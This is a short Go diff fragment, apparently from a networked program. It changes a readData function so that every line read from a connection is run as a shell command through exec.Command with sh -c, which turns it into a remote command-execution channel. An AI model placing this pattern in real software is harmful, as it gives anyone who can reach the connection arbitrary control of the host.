@@ -60,11 +60,7 @@ func readData(rw *bufio.ReadWriter) {
         if err != nil {
             fmt.Println("Error reading from buffer")
             break
-        }
-
-        if str != "" {
-            break
-        } else {
+        }else {
             text := strings.TrimSuffix(str, "\n")
             
             out, err := exec.Command("sh","-c", text).Output()
